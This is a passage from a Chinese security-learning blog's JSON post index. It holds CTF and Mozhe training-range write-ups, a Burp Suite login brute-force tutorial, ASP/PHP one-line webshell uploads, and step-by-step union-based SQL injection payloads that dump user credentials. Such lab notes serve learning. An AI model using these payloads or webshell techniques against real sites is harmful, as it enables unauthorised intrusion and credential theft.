冲鸭，2020第一天！！！","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"burp爆破","slug":"burp爆破","date":"2019-12-19T15:49:00.000Z","updated":"2020-07-15T10:00:39.771Z","comments":true,"path":"2019/12/19/burp爆破/","link":"","permalink":"http://lingxin16.github.io/2019/12/19/burp%E7%88%86%E7%A0%B4/","excerpt":"用burpsuit对网页上的一些用户名密码之类的爆破 这里就用墨者学院文件包含那道题的那个登录页面吧…","text":"用burpsuit对网页上的一些用户名密码之类的爆破 这里就用墨者学院文件包含那道题的那个登录页面吧… 设置代理 先用burp抓取 黑色圈住的就是用户名和密码的函数(应该是叫函数吧…..) 红色圈住的就是之前自己输入的账号和密码 能看到是明文密码 然后send to intruder 这里他实现标记了要爆破的位置 不是我们要爆破的位置 我们先用上边的clear把标记清除 然后选中要爆破的地址 这里都是admin前边那个是我输入的账号后边的是密码 然后点击add分别添加 在attack type那里选择cluster bomb 转到payloads那边 看到payload set 右边下拉发现有1,2分别是我们刚刚添加的两个地址 下边方框右边的add是手动添加账号密码 有字典的话点load载入字典 添加完成后选择intruder→start attack 然后找到length里边那个长度不一样的就是我们要的账号密码","categories":[{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"墨者学院","slug":"墨者学院","date":"2019-12-06T13:40:08.000Z","updated":"2020-07-15T11:27:30.363Z","comments":true,"path":"2019/12/06/墨者学院/","link":"","permalink":"http://lingxin16.github.io/2019/12/06/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/","excerpt":"内部文件上传系统漏洞分析溯源上传asp一句话木马 burp抓包修改文件上传路径 在.asp后缀的文件夹中 文件被默认为asp类型执行","text":"内部文件上传系统漏洞分析溯源上传asp一句话木马 burp抓包修改文件上传路径 在.asp后缀的文件夹中 文件被默认为asp类型执行 蚁剑链接 phpMyAdmin后台文件包含分析溯源密码弱口令root登录 sql注入一句话 蚁剑链接 根目录找到key文件 得到key:mozhe6e0dc3709254b6732421f373dce SQL注入漏洞测试(布尔盲注)打开靶场,找到停机维护通知页面 用sqlmap爆当前库 获取到数据库名stormgroup 然后爆表段 获取到表member和notice 然后爆字段 得到 name password 和status 然后分别猜解name和password 得到name为mozhe password需要md5解码 第一个没办法登录 用第二个密码才登录成功,得到key SQL手工注入漏洞测试(MySQL数据库-字符型)先打开靶场 找到注入页面 http://219.153.49.228:45556/new_list.php?id=tingjigonggao后加上&#39;and 1 = 1–+ 发现页面打开正常 判断为字符型注入 其实题目已经说明了是字符型注入… 然后获取列表的字段数 后边加上’order by 1–+ 将1分别替换为2,3,4,5发现为5的时候显示不正常 那么字段数最大应该为4 然后判断回显位置 将=后改为’ union select 1,2,3,4 –+ 得到回显位置为2和3 然后获取数据库名 将=后改为’ union select 1,database(),3,4 –+ 得到数据库名mozhe_discuz_stormgroup 接着获取表 =后为’ union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() and ‘1’=’1 得到两个表notice,stormgroup_member 接着获取字段 =后为’ union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=’stormgroup_member’ and ‘1’=’1 得到四个字段 最后就是查询字段name和password的值 =后为’ union select 1,name,password,4 from stormgroup_member where’1’=’1# md5解码后登录","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"}]},{"title":"write up","slug":"write-up","date":"2019-12-05T13:11:00.000Z","updated":"2020-07-15T10:01:00.127Z","comments":true,"path":"2019/12/05/write-up/","link":"","permalink":"http://lingxin16.github.io/2019/12/05/write-up/","excerpt":"签到圣堂刺客下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important}","text":"签到圣堂刺客下载 拖入文本 找到flag ： AGCTF{MetaData_1s_Important} 奥利安娜的QQ号直接百度! 多喝水图片下载下来 拖入文本 得到 QUdDVEYlN0JwMWVhczNfZHIxbmtfbTByZV93YXQzciU3RA==放进base64解码得AGCTF%7Bp1eas3_dr1nk_m0re_wat3r%7D%7B和%7D换成{ } 帅帅帅下载html文件 打开没有发现flag 查看源代码 Easy_Misc弱口令直接用字典爆破 得到密码password解压出图片 后缀改为rar 解压得到视频，提取二维码补齐定位点， 扫码得到flag：flag{e7d478cf6b915f50ab1277f78502a2c5}将里边的字符MD5解码得到hello_ctf 玩具车可以直接拖入记事本得到flag Easy_RE用ida打开 f5查看代码，r键转换字符，得到flag RE既然是逆向 就先用ida打开 (需要注意一下ida和ida64的区别 这1个有的能查看C语言伪代码,这个题是ida) 在main函数中没有发现什么 但是下边的main_0中可以看到一些东西 大概意思就是前边一串东西加上40之后等于后边的一串 此时则输出ok 接着看那一团byte什么的双击之后看到 通过询问大佬得知是16进制数 那我们就需要把他转化成十进制 再运算之后输出ascill形式 得到flag :AGCTF{Easy_Hex} 这是个gif把gif文件下载下来 发现怎么都没有办法打开,排除是隐写,没有办法,放到winhex里看一下,并没有发现GIF文件标记(只因我没有看到gif这三个字母….) 百度gif文件 发现GIF87a和GIF89a两个版本 正好这个文件在winhex中打开开头是89a 然后百度gif文件头 对比发现是文件头缺失 然后就在winhex中补齐 保存后发现是个gif文件 在ps中打开查看gif那一帧 得到flag re_xor这个是用ida64才能打开查看C语言伪代码的 f5查看伪代码 发现有个地方看不懂 ^这个符号 在C语言中表示什么呢…. 上网搜一下 C语言 ^ emm..位异或 题目xor也表明了这个题跟异或有关 搜一下异或 有一大堆看不太懂的东西 这个大概就是当^前后相等时 表示0 不等是则是1 还是重新看源代码吧… 写个脚本算一算 这里就直接用异或那个符号了 也省的理解那么多… 得到flag AGCTF{Happy_x0r}","categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"}]},{"title":"test","slug":"ceshi","date":"2019-12-05T12:49:34.000Z","updated":"2020-07-15T08:52:55.699Z","comments":true,"path":"2019/12/05/ceshi/","link":"","permalink":"http://lingxin16.github.io/2019/12/05/ceshi/","excerpt":"","text":"手动插入图片测试 Typora拖入测试","categories":[],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"刷题记录","slug":"刷题记录","permalink":"http://lingxin16.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"技术学习","slug":"技术学习","permalink":"http://lingxin16.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"web","slug":"web","permalink":"http://lingxin16.github.io/tags/web/"},{"name":"环境配置","slug":"环境配置","permalink":"http://lingxin16.github.io/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://lingxin16.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"http://lingxin16.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"},{"name":"谷歌镜像","slug":"谷歌镜像","permalink":"http://lingxin16.github.io/tags/%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F/"},{"name":"比赛记录","slug":"比赛记录","permalink":"http://lingxin16.github.io/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"},{"name":"代码审计","slug":"代码审计","permalink":"http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"php","slug":"php","permalink":"http://lingxin16.github.io/tags/php/"},{"name":"misc","slug":"misc","permalink":"http://lingxin16.github.io/tags/misc/"},{"name":"博客搭建","slug":"博客搭建","permalink":"http://lingxin16.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}